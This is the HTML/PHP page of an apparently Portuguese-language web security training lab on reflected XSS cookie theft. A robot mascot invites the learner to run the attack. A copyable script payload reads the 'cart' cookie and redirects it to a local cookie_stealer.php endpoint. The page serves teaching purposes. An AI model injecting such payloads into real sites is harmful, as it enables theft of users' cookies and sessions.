<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <link href="../css/menu.css" rel="stylesheet">
    <link href="../css/fonts.css" rel="stylesheet">
    <link href="../css/tutorial_before_lab.css" rel="stylesheet">
    <link href="../css/general_config.css" rel="stylesheet">
    <link href="../css/tutorials_box.css" rel="stylesheet">
    <link href="../css/copy_button.css" rel="stylesheet">
    <script src="../js/jquery.js"></script>
    <script src="../js/bootstrap.min.js"></script>
    <script src="../js/bootstrap.js"></script>
    <script src="../js/popper.min.js"></script>
    <script src="../js/bootstrap.bundle.min.js"></script>
    <script src="../js/bootstrap.bundle.js"></script>
    <script src="../js/bootstrap.min4.5.js"></script>

    <title>Cookie XSS Refletido</title>
</head>

<style>

body {
    overflow-x: hidden;
}	
.writer{
    padding-left:10px;
    padding-top: 5px;
    padding-bottom: 5px;
}

.image-container {
    margin-left: 0px;
    padding-left: 10px;
    padding-top: 5px;
}
.image-container img{
    width: 85%;
    height: auto;
}
.robot-speech {
    min-width: 460px;
    max-width: 460px;
}
.robot-speech::after{
    top: -20px; 
    right: 5px; 
    transform: rotate(45deg);  
}
.container-robot {
    padding: 0;
    display: block;
    margin-top: 10px;
    z-index: 10;
    max-height: 10px;
    width: 25vw; 
    margin-right: 10px;
}
#robot-img{
    width: 250px;
    height: 250px;
    transform: translate(-10px, -30px);
}
.code{
    text-align:left;
    padding-left: 90px;
    margin-top: 80px;
    margin-bottom: 50px;
    margin-right: 95px;
}

</style>

<body>
    
<div style="display: flex; width: 100%;">
    <?php include '../menu_lateral_interm.php'; ?>
    <div class="content" style="margin: 0px">
            <div class="image-container">
            <img src="../img/tutorial/intermediario-refletido2-pagina2.png" alt="">
            </div>
    
    <div class ="container-robot" style="transform: translate(32vw, -8vw) scale(1);">
        <div class="robot-speech">
            <p class="writer" id="balloon-text">
            Após inserir o script, podemos verificar que o carrinho possui 2 unidades de 'Box Anti Hacker' e 1 unidade de 'Gerador de Senhas'! Agora é sua vez. Execute o ataque e observe o resultado!
        </div>
        <div class="robot d-inline-flex align-items-center justify-content-center">
        <img src="../img/robot.png" alt="robot-icon" id="robot-img" >
        </div>
  </div>
        <div class="code">
        <div id="codeBlock">
        <code>
        &lt;script&gt;window.location="./cookie_stealer.php?atividade=ref_cookie&amp;cart=" + encodeURIComponent(document.cookie.split("; ").find(row =&gt; row.startsWith("cart="))?.split("=")[1]);&lt;/script&gt;
        </code>
        </div>
        <button class="copyButton" id="copyButton">Copiar Código</button>
        <button class="copyButton copied" id="copied">Copiado <img src="../img/check.png" alt="" width=20px;></button>
        </div>

        <div class="container-buttons">
        <a href="./lab2-refletido1.php"  style="color: white; text-decoration: none; z-index:100;">
            <div class="btn btn-primary transition-button" id="transition-back">
            &lt;&lt;Retornar
            </div>
        </a>
        <button class="btn btn-primary transition-button" id="transition-next" style="color: white; text-decoration: none;" onclick="finishTask(taskNo, redirPath)">
                    Laboratório&gt;&gt;
                </button>
                </div>
            </div>
    </div>
</div>

<script>
var taskNo = 11;
var redirPath = "../laboratorio/cart.php?atividade=ref_cookie";
let caso = 'EIA';
</script>
<script src ="../js/robotUpdate.js"></script>
<script src="../js/copy_button.js"></script>
<script src="../js/progress.js"></script>
<script src="../js/writerTutorial.js"></script>
<script src="../js/menuLateral.js"></script>
<script src="../js/robotAdjustment.js"></script>
<script>
transformRobotForMenuState(-6, 0);
</script>
</body>
</html>
